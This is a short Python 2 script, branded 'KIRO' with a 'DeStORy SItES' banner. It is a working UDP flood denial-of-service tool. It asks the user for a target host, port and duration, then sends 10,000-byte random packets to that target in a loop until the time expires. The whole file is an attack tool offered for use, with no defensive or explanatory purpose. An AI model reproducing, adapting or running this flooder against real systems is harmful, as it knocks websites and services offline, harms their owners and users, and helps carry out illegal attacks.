#!/usr/bin/python
#!--- The Tool By KIRO
#colors
wi = "\033[1;37m" 
rd = "\033[0;31m" 
gr = "\033[1;32m" 
yl = "\033[1;33m" 
pu = "\033[1;35m" 
#------------------#
import os
import socket
import time 
import random
import sys
#------------------#

def doss():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    payloads = random._urandom(10000)

    os.system("clear")
    print rd+'''
      _____   _____   _____   _____   _____   _____   __    __       _____   _   _____   _____   _____  
        _  \ | ____| /  ___/ |_   _| /  _  \ |  _  \  \ \  / /      /  ___/ | | |_   _| | ____| /  ___/ 
     | | | | | |__   | |___    | |   | | | | | |_| |   \ \/ /       | |___  | |   | |   | |__   | |___  
     | | | | |  __|  \___  \   | |   | | | | |  _  /    \  /        \___  \ | |   | |   |  __|  \___  \ 
     | |_| | | |___   ___| |   | |   | |_| | | | \ \    / /          ___| | | |   | |   | |___   ___| | 
     |_____/ |_____| /_____/   |_|   \_____/ |_|  \_\  /_/          /_____/ |_|   |_|   |_____| /_____/ 
    '''
    print '''
                                +------------------------------+
                                | [+]         KIRO          [+]|
                                +-----+-----------------+--+---+
                                      |   DDOS Attack   |     
                                      +-----------------+
    '''
    print'\n'
    print'\n'
    ip = raw_input(yl+"[*] ip or host Target : ")
    port = input(wi+"[*] port [Default port 80 ] :")
    seconds = input(rd+"[*] time the Attack : ")
    timeout = time.time() + seconds

    sent = 10 

    while True:

        try:

            if time.time() > timeout:
                break

            else:
                pass
            sock.sendto(payloads,(ip,port))
            sent = sent + 1 
            print (rd+' DeStORy SItES Attacking on %s .... ') % (ip)
        except KeyboardInterrupt:
            sys.exit()

doss()
